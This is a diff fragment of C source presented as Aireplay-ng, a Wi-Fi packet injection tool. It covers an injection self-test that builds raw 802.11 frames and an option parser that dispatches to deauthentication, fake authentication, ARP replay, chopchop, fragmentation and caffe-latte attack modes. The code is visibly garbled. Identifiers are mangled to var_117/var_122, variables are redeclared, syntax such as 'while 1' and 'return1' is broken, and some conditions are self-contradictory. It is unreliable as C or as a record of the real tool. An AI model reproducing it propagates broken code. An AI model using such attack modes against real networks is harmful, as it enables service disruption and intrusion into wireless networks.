+            PCT; printf("Injection is working!\n\n");
+            var_117=1;
+        }
+    }
+
+    if(opt.bittest)
+    {
+        if(var_117 > 0)
+        {
+            PCT; printf("Trying directed probe requests for all bitrates...\n");
+        }
+
+        for(var_122=0; var_122<var_117; var_122++)
+        {
+            if(ap[var_122].found <= 0)
+                continue;
+            printf("\n");
+            PCT; printf("%02X:%02X:%02X:%02X:%02X:%02X - channel: %d - \'%s\'\n", ap[var_122].bssid[0], ap[var_122].bssid[1],
+                        ap[var_122].bssid[2], ap[var_122].bssid[3], ap[var_122].bssid[4], ap[var_122].bssid[5], ap[var_122].chan, ap[var_122].essid);
+
+            var_117 = INT_MAX;
+            max = 0;
+            avg = 0;
+
+            memcpy(h80211, "\x40\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\xCC\xCC\xCC\xCC\xCC\xCC" "\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00", 24);
+
+            var_117 = 24;
+
+            h80211[24] = 0x00;
+            h80211[25] = ap[var_122].len;
+            memcpy(h80211+var_117+2, ap[var_122].essid, ap[var_122].len);
+
+            var_117 += ap[var_122].len+2;
+
+            memcpy(h80211+var_117, "\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C", 16);
+
+            var_117 += 16;
+
+            for(var_117=0; var_117<12; var_117++)
+            {
+                ap[var_122].found=0;
+                if(set_bitrate(var_122, bitrates[var_117]))
+                    continue;
+
+
+                avg2 = 0;
+                memset(ap[var_122].pwr, 0, 30*sizeof(unsigned int));
+
+                for(var_117=0; var_117<30; var_117++)
+                {
+
+
+
+                    opt.r_smac[0] = 0x00;
+                    opt.r_smac[1] = rand() & 0xFF;
+                    opt.r_smac[2] = rand() & 0xFF;
+                    opt.r_smac[3] = rand() & 0xFF;
+                    opt.r_smac[4] = rand() & 0xFF;
+                    opt.r_smac[5] = rand() & 0xFF;
+
+                    memcpy(h80211+10, opt.r_smac, 6);
+
+                    send_packet(h80211, var_117);
+
+                    gettimeofday( &tv, NULL );
+
+                    printf( "\r%2d/%2d: %3d%%\r", ap[var_122].found, var_117+1, ((ap[var_122].found*100)/(var_117+1)));
+                    fflush(stdout);
+                    while 1
+                    {
+                        var_117 = read_packet(packet, sizeof(packet), &ri);
+
+                        if (packet[0] == 0x50 )
+                        {
+                            if (! memcmp(opt.r_smac, packet+4, 6))
+                            {
+                                if(! memcmp(ap[var_122].bssid, packet+16, 6))
+                                {
+                                    if(!var_117)
+                                    {
+                                        var_117++;
+                                    }
+                                    ap[var_122].found++;
+                                    if((signed)ri.ri_power > -200)
+                                        ap[var_122].pwr[var_117] = (signed)ri.ri_power;
+                                    break;
+                                }
+                            }
+                        }
+
+                        gettimeofday( &tv2, NULL );
+                        if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > 100000)
+                        {
+                            break;
+                        }
+                        usleep(10);
+                    }
+                    printf( "\r%2d/%2d: %3d%%\r", ap[var_122].found, var_117+1, ((ap[var_122].found*100)/(var_117+1)));
+                    fflush(stdout);
+                }
+                for(var_117=0; var_117<30; var_117++)
+                    avg2 += ap[var_122].pwr[var_117];
+                if(ap[var_122].found > 0)
+                    avg2 /= ap[var_122].found;
+                PCT; printf("Probing at %2.1f Mbps:\t%2d/%2d: %3d%%\n", wi_get_rate(var_122)/1000000.0,
+                            ap[var_122].found, 30, ((ap[var_122].found*100)/30));
+            }
+
+            if(!var_117 && var_117)
+            {
+                PCT; printf("Injection is working!\n\n");
+                if(opt.fast) return 0;
+                var_117=1;
+            }
+        }
+    }
+    if(opt.bittest)
+        set_bitrate(var_122, 1000000);
+
+    if( opt.s_face != NULL )
+    {
+        printf("\n");
+        PCT; printf("Trying card-to-card injection...\n");
+
+
+        if(wi_get_channel(var_122) != wi_get_channel(var_122))
+        {
+            wi_set_channel(var_122, wi_get_channel(var_122));
+        }
+
+
+        for(var_122=0; var_122<5; var_122++)
+        {
+            var_117=0;
+
+            opt.f_smac[0] = 0x00;
+            opt.f_smac[1] = rand() & 0xFF;
+            opt.f_smac[2] = rand() & 0xFF;
+            opt.f_smac[3] = rand() & 0xFF;
+            opt.f_smac[4] = rand() & 0xFF;
+            opt.f_smac[5] = rand() & 0xFF;
+
+            opt.f_dmac[0] = 0x00;
+            opt.f_dmac[1] = rand() & 0xFF;
+            opt.f_dmac[2] = rand() & 0xFF;
+            opt.f_dmac[3] = rand() & 0xFF;
+            opt.f_dmac[4] = rand() & 0xFF;
+            opt.f_dmac[5] = rand() & 0xFF;
+
+            opt.f_bssid[0] = 0x00;
+            opt.f_bssid[1] = rand() & 0xFF;
+            opt.f_bssid[2] = rand() & 0xFF;
+            opt.f_bssid[3] = rand() & 0xFF;
+            opt.f_bssid[4] = rand() & 0xFF;
+            opt.f_bssid[5] = rand() & 0xFF;
+
+            if(var_122==0)
+            {
+                memcpy( h80211, "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" "\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00", 26 );
+                memcpy( h80211 + 16, opt.f_bssid, 6 );
+                memcpy( h80211 + 4, opt.f_dmac, 6 );
+                memcpy( h80211 + 10, opt.f_smac, 6 );
+
+                opt.f_iswep = 0;
+                opt.f_tods = 0; opt.f_fromds = 0;
+                opt.f_minlen = opt.f_maxlen = 26;
+            }
+            else if(var_122==1)
+            {
+                memcpy( h80211, "\xB0\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" "\xBB\xBB\xBB\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00", 30 );
+                memcpy( h80211 + 4, opt.f_dmac, 6 );
+                memcpy( h80211 + 10, opt.f_smac , 6 );
+                memcpy( h80211 + 16, opt.f_bssid, 6 );
+
+                opt.f_iswep = 0;
+                opt.f_tods = 0; opt.f_fromds = 0;
+                opt.f_minlen = opt.f_maxlen = 30;
+            }
+            else if(var_122==2)
+            {
+                memcpy( h80211, ska_auth3, 24);
+                memcpy( h80211 + 4, opt.f_dmac, 6);
+                memcpy( h80211 + 10, opt.f_smac, 6);
+                memcpy( h80211 + 16, opt.f_bssid, 6);
+
+
+                h80211[24] = 0x86;
+                h80211[25] = 0xD8;
+                h80211[26] = 0x2E;
+                h80211[27] = 0x00;
+
+
+                for(var_117=0; var_117<132; var_117++)
+                    h80211[28+var_117] = rand() & 0xFF;
+
+                opt.f_iswep = 1;
+                opt.f_tods = 0; opt.f_fromds = 0;
+                opt.f_minlen = opt.f_maxlen = 160;
+            }
+            else if(var_122==3)
+            {
+                memcpy( h80211, "\x48\x01\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" "\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B", 24);
+                memcpy( h80211 + 4, opt.f_bssid, 6);
+                memcpy( h80211 + 10, opt.f_smac, 6);
+                memcpy( h80211 + 16, opt.f_dmac, 6);
+
+
+                h80211[24] = 0x86;
+                h80211[25] = 0xD8;
+                h80211[26] = 0x2E;
+                h80211[27] = 0x00;
+
+
+                for(var_117=0; var_117<132; var_117++)
+                    h80211[28+var_117] = rand() & 0xFF;
+
+                opt.f_iswep = -1;
+                opt.f_tods = 1; opt.f_fromds = 0;
+                opt.f_minlen = opt.f_maxlen = 160;
+            }
+            else if(var_122==4)
+            {
+                memcpy( h80211, "\x48\x01\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" "\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B", 24);
+                memcpy( h80211 + 4, opt.f_bssid, 6);
+                memcpy( h80211 + 10, opt.f_smac, 6);
+                memcpy( h80211 + 16, opt.f_dmac, 6);
+
+                h80211[1] |= 0x04;
+                h80211[22] = 0x0A;
+                h80211[23] = 0x00;
+
+
+                h80211[24] = 0x86;
+                h80211[25] = 0xD8;
+                h80211[26] = 0x2E;
+                h80211[27] = 0x00;
+
+
+                for(var_117=0; var_117<7; var_117++)
+                    h80211[28+var_117] = rand() & 0xFF;
+
+                opt.f_iswep = -1;
+                opt.f_tods = 1; opt.f_fromds = 0;
+                opt.f_minlen = opt.f_maxlen = 35;
+            }
+
+            for(var_117=0; (var_117<7 && !var_117); var_117++)
+            {
+                send_packet( h80211, opt.f_minlen );
+
+                gettimeofday( &tv, NULL );
+                while 1
+                {
+                    var_117 = read_packet(packet, sizeof(packet), &ri);
+                    if ( filter_packet(packet, var_117) == 0 )
+                    {
+                        if(!var_117)
+                        {
+                            var_117++;
+                        }
+
+                        if(var_122 == 0)
+                        {
+                            if( h80211[0] == packet[0] )
+                            {
+                                var_117=1;
+                                break;
+                            }
+                        }
+                        else if(var_122==1)
+                        {
+                            if( h80211[0] == packet[0] )
+                            {
+                                var_117=1;
+                                break;
+                            }
+                        }
+                        else if(var_122==2)
+                        {
+                            if( h80211[0] == packet[0] && memcmp(h80211+24, packet+24, var_117-24) == 0 )
+                            {
+                                var_117=1;
+                                break;
+                            }
+                        }
+                        else if(var_122==3)
+                        {
+                            if( h80211[0] == packet[0] && memcmp(h80211+24, packet+24, var_117-24) == 0 )
+                            {
+                                var_117=1;
+                                break;
+                            }
+                        }
+                        else if(var_122==4)
+                        {
+                            if( h80211[0] == packet[0] && memcmp(h80211+24, packet+24, var_117-24) == 0 )
+                            {
+                               if( (packet[1] & 0x04) && memcmp( h80211+22, packet+22, 2 ) == 0 )
+                               {
+                                    var_117=1;
+                                    break;
+                               }
+                            }
+                        }
+                    }
+
+                    gettimeofday( &tv2, NULL );
+                    if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (3*var_117*1000))
+                    {
+                        break;
+                    }
+                    usleep(10);
+                }
+            }
+            if(var_117)
+            {
+                var_117=0;
+                if(var_122==0)
+                {
+                    PCT; printf("Attack -0:           OK\n");
+                }
+                else if(var_122==1)
+                {
+                    PCT; printf("Attack -1 (open):    OK\n");
+                }
+                else if(var_122==2)
+                {
+                    PCT; printf("Attack -1 (psk):     OK\n");
+                }
+                else if(var_122==3)
+                {
+                    PCT; printf("Attack -2/-3/-4/-6:  OK\n");
+                }
+                else if(var_122==4)
+                {
+                    PCT; printf("Attack -5/-7:        OK\n");
+                }
+            }
+            else
+            {
+                if(var_122==0)
+                {
+                    PCT; printf("Attack -0:           Failed\n");
+                }
+                else if(var_122==1)
+                {
+                    PCT; printf("Attack -1 (open):    Failed\n");
+                }
+                else if(var_122==2)
+                {
+                    PCT; printf("Attack -1 (psk):     Failed\n");
+                }
+                else if(var_122==3)
+                {
+                    PCT; printf("Attack -2/-3/-4/-6:  Failed\n");
+                }
+                else if(var_122==4)
+                {
+                    PCT; printf("Attack -5/-7:        Failed\n");
+                }
+            }
+        }
+
+        if(!var_117 && var_117)
+        {
+            PCT; printf("Injection is working!\n");
+            if(opt.fast) return 0;
+            var_117=1;
+        }
+    }
+    return 0;
+}
+
+int fn_117( int var_122, char *argv[] )
+{
+    int var_122, var_122, var_122;
+
+
+
+    memset( &opt, 0, sizeof( opt ) );
+    memset( &dev, 0, sizeof( dev ) );
+
+    opt.f_type = -1; opt.f_subtype = -1;
+    opt.f_minlen = -1; opt.f_maxlen = -1;
+    opt.f_tods = -1; opt.f_fromds = -1;
+    opt.f_iswep = -1; opt.ringbuffer = 8;
+
+    opt.a_mode = -1; opt.r_fctrl = -1;
+    opt.ghost = 0;
+    opt.delay = 15; opt.bittest = 0;
+    opt.fast = 0; opt.r_smac_set = 0;
+    opt.npackets = 1; opt.nodetect = 0;
+    opt.rtc = 1; opt.f_retry = 0;
+    opt.reassoc = 0;
+
+    while1
+    {
+        int var_122 = 0;
+
+        static struct struct_120 long_options[] = {
+            {"deauth", 1, 0, '0'},
+            {"fakeauth", 1, 0, '1'},
+            {"interactive", 0, 0, '2'},
+            {"arpreplay", 0, 0, '3'},
+            {"chopchop", 0, 0, '4'},
+            {"fragment", 0, 0, '5'},
+            {"caffe-latte", 0, 0, '6'},
+            {"cfrag", 0, 0, '7'},
+            {"test", 0, 0, '9'},
+            {"help", 0, 0, 'H'},
+            {"fast", 0, 0, 'F'},
+            {"bittest", 0, 0, 'B'},
+            {"migmode", 0, 0, '8'},
+            {"ignore-negative-one", 0, &opt.ignore_negative_one, 1},
+            {0, 0, 0, 0 }
+        };
+
+        int var_122 = getopt_long( var_122, argv,
+                        "b:d:s:m:n:u:v:t:T:f:g:w:x:p:a:c:h:e:ji:r:k:l:y:o:q:Q0:1:23456789HFBDR",
+                        long_options, &var_122 );
+
+        if( var_122 < 0 ) break;
+
+        switch( var_122 )
+        {
+            case 0 :
+
+                break;
+
+            case ':' :
+
+                printf("\"%s --help\" for help.\n", argv[0]);
+                return1;
+
+            case '?' :
+
+                printf("\"%s --help\" for help.\n", argv[0]);
+                return1;
+
+            case 'b' :
+
+                if( getmac( optarg, 1 ,opt.f_bssid ) != 0 )
+                {
+                    printf( "Invalid BSSID (AP MAC address).\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 'd' :
+
+                if( getmac( optarg, 1, opt.f_dmac ) != 0 )
+                {
+                    printf( "Invalid destination MAC address.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 's' :
+
+                if( getmac( optarg, 1, opt.f_smac ) != 0 )
+                {
+                    printf( "Invalid source MAC address.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 'm' :
+
+                var_122 = sscanf( optarg, "%d", &opt.f_minlen );
+                if( opt.f_minlen < 0 || var_122 != 1 )
+                {
+                    printf( "Invalid minimum length filter. [>=0]\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 'n' :
+
+                var_122 = sscanf( optarg, "%d", &opt.f_maxlen );
+                if( opt.f_maxlen < 0 || var_122 != 1 )
+                {
+                    printf( "Invalid maximum length filter. [>=0]\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 'u' :
+
+                var_122 = sscanf( optarg, "%d", &opt.f_type );
+                if( opt.f_type < 0 || opt.f_type > 3 || var_122 != 1 )
+                {
+                    printf( "Invalid type filter. [0-3]\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 'v' :
+
+                var_122 = sscanf( optarg, "%d", &opt.f_subtype );
+                if( opt.f_subtype < 0 || opt.f_subtype > 15 || var_122 != 1 )
+                {
+                    printf( "Invalid subtype filter. [0-15]\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 'T' :
+  var_122 = sscanf(optarg, "%d", &opt.f_retry);
+  if ((opt.f_retry < 1) || (opt.f_retry > 65535) || (var_122 != 1)) {
+   printf("Invalid retry setting. [1-65535]\n");
+   printf("\"%s --help\" for help.\n", argv[0]);
+   return1;
+  }
+  break;
+
+            case 't' :
+
+                var_122 = sscanf( optarg, "%d", &opt.f_tods );
+                if(( opt.f_tods != 0 && opt.f_tods != 1 ) || var_122 != 1 )
+                {
+                    printf( "Invalid tods filter. [0,1]\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 'f' :
+
+                var_122 = sscanf( optarg, "%d", &opt.f_fromds );
+                if(( opt.f_fromds != 0 && opt.f_fromds != 1 ) || var_122 != 1 )
+                {
+                    printf( "Invalid fromds filter. [0,1]\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 'w' :
+
+                var_122 = sscanf( optarg, "%d", &opt.f_iswep );
+                if(( opt.f_iswep != 0 && opt.f_iswep != 1 ) || var_122 != 1 )
+                {
+                    printf( "Invalid wep filter. [0,1]\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 'x' :
+
+                var_122 = sscanf( optarg, "%d", &opt.r_nbpps );
+                if( opt.r_nbpps < 1 || opt.r_nbpps > 1024 || var_122 != 1 )
+                {
+                    printf( "Invalid number of packets per second. [1-1024]\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 'o' :
+
+                var_122 = sscanf( optarg, "%d", &opt.npackets );
+                if( opt.npackets < 0 || opt.npackets > 512 || var_122 != 1 )
+                {
+                    printf( "Invalid number of packets per burst. [0-512]\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 'q' :
+
+                var_122 = sscanf( optarg, "%d", &opt.delay );
+                if( opt.delay < 1 || opt.delay > 600 || var_122 != 1 )
+                {
+                    printf( "Invalid number of seconds. [1-600]\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 'Q' :
+
+                opt.reassoc = 1;
+                break;
+
+            case 'p' :
+
+                var_122 = sscanf( optarg, "%x", &opt.r_fctrl );
+                if( opt.r_fctrl < 0 || opt.r_fctrl > 65535 || var_122 != 1 )
+                {
+                    printf( "Invalid frame control word. [0-65535]\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 'a' :
+
+                if( getmac( optarg, 1, opt.r_bssid ) != 0 )
+                {
+                    printf( "Invalid AP MAC address.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 'c' :
+
+                if( getmac( optarg, 1, opt.r_dmac ) != 0 )
+                {
+                    printf( "Invalid destination MAC address.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 'g' :
+
+                var_122 = sscanf( optarg, "%d", &opt.ringbuffer );
+                if( opt.ringbuffer < 1 || var_122 != 1 )
+                {
+                    printf( "Invalid replay ring buffer size. [>=1]\n");
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case 'h' :
+
+                if( getmac( optarg, 1, opt.r_smac ) != 0 )
+                {
+                    printf( "Invalid source MAC address.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                opt.r_smac_set=1;
+                break;
+
+            case 'e' :
+
+                memset( opt.r_essid, 0, sizeof( opt.r_essid ) );
+                strncpy( opt.r_essid, optarg, sizeof( opt.r_essid ) - 1 );
+                break;
+
+            case 'j' :
+
+                opt.r_fromdsinj = 1;
+                break;
+
+            case 'D' :
+
+                opt.nodetect = 1;
+                break;
+
+            case 'k' :
+
+                inet_aton( optarg, (struct struct_122 *) opt.r_dip );
+                break;
+
+            case 'l' :
+
+                inet_aton( optarg, (struct struct_122 *) opt.r_sip );
+                break;
+
+            case 'y' :
+
+                if( opt.prga != NULL )
+                {
+                    printf( "PRGA file already specified.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                if( read_prga(&(opt.prga), optarg) != 0 )
+                {
+                    return1;
+                }
+                break;
+
+            case 'i' :
+
+                if( opt.s_face != NULL || opt.s_file )
+                {
+                    printf( "Packet source already specified.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                opt.s_face = optarg;
+                opt.port_in = get_ip_port(opt.s_face, opt.ip_in, sizeof(opt.ip_in)-1);
+                break;
+
+            case 'r' :
+
+                if( opt.s_face != NULL || opt.s_file )
+                {
+                    printf( "Packet source already specified.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                opt.s_file = optarg;
+                break;
+
+            case 'z' :
+
+                opt.ghost = 1;
+
+                break;
+
+            case '0' :
+
+                if( opt.a_mode != -1 )
+                {
+                    printf( "Attack mode already specified.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                opt.a_mode = 0;
+
+                for (var_122=0; optarg[var_122] != 0; var_122++)
+                {
+                    if (isdigit((int)optarg[var_122]) == 0)
+                        break;
+                }
+
+                var_122 = sscanf( optarg, "%d", &opt.a_count );
+                if( opt.a_count < 0 || optarg[var_122] != 0 || var_122 != 1)
+                {
+                    printf( "Invalid deauthentication count or missing value. [>=0]\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case '1' :
+
+                if( opt.a_mode != -1 )
+                {
+                    printf( "Attack mode already specified.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                opt.a_mode = 1;
+
+                for (var_122=0; optarg[var_122] != 0; var_122++)
+                {
+                    if (isdigit((int)optarg[var_122]) == 0)
+                        break;
+                }
+
+                var_122 = sscanf( optarg, "%d", &opt.a_delay );
+                if( opt.a_delay < 0 || optarg[var_122] != 0 || var_122 != 1)
+                {
+                    printf( "Invalid reauthentication delay or missing value. [>=0]\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                break;
+
+            case '2' :
+
+                if( opt.a_mode != -1 )
+                {
+                    printf( "Attack mode already specified.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                opt.a_mode = 2;
+                break;
+
+            case '3' :
+
+                if( opt.a_mode != -1 )
+                {
+                    printf( "Attack mode already specified.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                opt.a_mode = 3;
+                break;
+
+            case '4' :
+
+                if( opt.a_mode != -1 )
+                {
+                    printf( "Attack mode already specified.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                opt.a_mode = 4;
+                break;
+
+            case '5' :
+
+                if( opt.a_mode != -1 )
+                {
+                    printf( "Attack mode already specified.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                opt.a_mode = 5;
+                break;
+
+            case '6' :
+
+                if( opt.a_mode != -1 )
+                {
+                    printf( "Attack mode already specified.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                opt.a_mode = 6;
+                break;
+
+            case '7' :
+
+                if( opt.a_mode != -1 )
+                {
+                    printf( "Attack mode already specified.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                opt.a_mode = 7;
+                break;
+
+            case '9' :
+
+                if( opt.a_mode != -1 )
+                {
+                    printf( "Attack mode already specified.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                opt.a_mode = 9;
+                break;
+
+            case '8' :
+
+                if( opt.a_mode != -1 )
+                {
+                    printf( "Attack mode already specified.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return1;
+                }
+                opt.a_mode = 8;
+                break;
+
+            case 'F' :
+
+                opt.fast = 1;
+                break;
+
+            case 'B' :
+
+                opt.bittest = 1;
+                break;
+
+            case 'H' :
+
+                printf( usage, getVersion("Aireplay-ng", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC) );
+                return1;
+
+            case 'R' :
+
+                opt.rtc = 0;
+                break;
+
+            default : goto usage;
+        }
+    }
+
+    if( var_122 - optind != 1 )
+    {
+     if(var_122 == 1)
+     {
+usage:
+         printf( usage, getVersion("Aireplay-ng", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC) );
+        }
+     if( var_122 - optind == 0)
+     {
+      printf("No replay interface specified.\n");
+     }
+     if(var_122 > 1)
+     {
+      printf("\"%s --help\" for help.\n", argv[0]);
+     }
+        return1;
+    }
+
+    if( opt.a_mode == -1 )
+    {
+        printf( "Please specify an attack mode.\n" );
+     printf("\"%s --help\" for help.\n", argv[0]);
+        return1;
+    }
+
+    if( (opt.f_minlen > 0 && opt.f_maxlen > 0) && opt.f_minlen > opt.f_maxlen )
+    {
+        printf( "Invalid length filter (min(-m):%d > max(-n):%d).\n",
+                opt.f_minlen, opt.f_maxlen );
+    printf("\"%s --help\" for help.\n", argv[0]);
+        return1;
+    }
+
+    if ( opt.f_tods == 1 && opt.f_fromds == 1 )
+    {
+        printf( "FromDS and ToDS bit are set: packet has to come from the AP and go to the AP\n" );
+    }
+
+    dev.fd_rtc = -1;
+
+    opt.iface_out = argv[optind];
+    opt.port_out = get_ip_port(opt.iface_out, opt.ip_out, sizeof(opt.ip_out)-1);
+
+
+    if( ! (opt.a_mode == 9 && opt.port_out >= 0 ) )
+    {
+
+        var_122 = wi_open(opt.iface_out);
+        if (!var_122)
+            return 1;
+        dev.fd_out = wi_fd(var_122);
+
+
+        if( opt.s_face != NULL )
+        {
+
+            if( ! (opt.a_mode == 9 && opt.port_in >= 0 ) )
+            {
+                var_122 = wi_open(opt.s_face);
+                if (!var_122)
+                    return 1;
+                dev.fd_in = wi_fd(var_122);
+                wi_get_mac(var_122, dev.mac_in);
+            }
+        }
+        else
+        {
+            var_122 = var_122;
+            dev.fd_in = dev.fd_out;
+
+
+            dev.arptype_in = dev.arptype_out;
+            wi_get_mac(var_122, dev.mac_in);
+        }
+
+        wi_get_mac(var_122, dev.mac_out);
+    }
+
+
+    if (setuid( getuid() ) == -1) {
+  perror("setuid");
+ }
+
+
+    if( opt.r_nbpps == 0 )
+    {
+        if( dev.is_wlanng || dev.is_hostap )
+            opt.r_nbpps = 200;
+        else
+            opt.r_nbpps = 500;
+    }
+
+
+    if( opt.s_file != NULL )
+    {
+        if( ! ( dev.f_cap_in = fopen( opt.s_file, "rb" ) ) )
+        {
+            perror( "open failed" );
+            return1;
+        }
+
+        var_122 = sizeof( struct struct_122 );
+
+        if( fread( &dev.pfh_in, 1, var_122, dev.f_cap_in ) != (size_t) var_122 )
+        {
+            perror( "fread(pcap file header) failed" );
+            return1;
+        }
+
+        if( dev.pfh_in.magic != TCPDUMP_MAGIC &&
+            dev.pfh_in.magic != TCPDUMP_CIGAM )
+        {
+            fprintf( stderr, "\"%s\" isn't a pcap file (expected "
+                             "TCPDUMP_MAGIC).\n", opt.s_file );
+            return1;
+        }
+
+        if( dev.pfh_in.magic == TCPDUMP_CIGAM )
+            SWAP32(dev.pfh_in.linktype);
+
+        if( dev.pfh_in.linktype != LINKTYPE_IEEE802_11 &&
+            dev.pfh_in.linktype != LINKTYPE_PRISM_HEADER &&
+            dev.pfh_in.linktype != LINKTYPE_RADIOTAP_HDR &&
+            dev.pfh_in.linktype != LINKTYPE_PPI_HDR )
+        {
+            fprintf( stderr, "Wrong linktype from pcap file header "
+                             "(expected LINKTYPE_IEEE802_11) -\n"
+                             "this doesn't look like a regular 802.11 "
+                             "capture.\n" );
+            return1;
+        }
+    }
+
+
+    if( maccmp( opt.r_smac, NULL_MAC) == 0 )
+    {
+        memcpy( opt.r_smac, dev.mac_out, 6);
+        if(opt.a_mode != 0 && opt.a_mode != 4 && opt.a_mode != 9)
+        {
+            printf("No source MAC (-h) specified. Using the device MAC (%02X:%02X:%02X:%02X:%02X:%02X)\n",
+                    dev.mac_out[0], dev.mac_out[1], dev.mac_out[2], dev.mac_out[3], dev.mac_out[4], dev.mac_out[5]);
+        }
+    }
+
+    if( maccmp( opt.r_smac, dev.mac_out) != 0 && maccmp( opt.r_smac, NULL_MAC) != 0)
+    {
+
+        fprintf( stderr, "The interface MAC (%02X:%02X:%02X:%02X:%02X:%02X)"
+                 " doesn't match the specified MAC (-h).\n"
+                 "\tifconfig %s hw ether %02X:%02X:%02X:%02X:%02X:%02X\n",
+                 dev.mac_out[0], dev.mac_out[1], dev.mac_out[2], dev.mac_out[3], dev.mac_out[4], dev.mac_out[5],
+                 opt.iface_out, opt.r_smac[0], opt.r_smac[1], opt.r_smac[2], opt.r_smac[3], opt.r_smac[4], opt.r_smac[5] );
+    }
+
+    switch( opt.a_mode )
+    {
+        case 0 : return( do_attack_deauth() );
+        case 1 : return( do_attack_fake_auth() );
+        case 2 : return( do_attack_interactive() );
+        case 3 : return( do_attack_arp_resend() );
+        case 4 : return( do_attack_chopchop() );
+        case 5 : return( do_attack_fragment() );
+        case 6 : return( do_attack_caffe_latte() );
+        case 7 : return( do_attack_cfrag() );
+        case 8 : return( do_attack_migmode() );
+        case 9 : return( do_attack_test() );
+        default: break;
+    }
+
+
+
+    return0;
+}
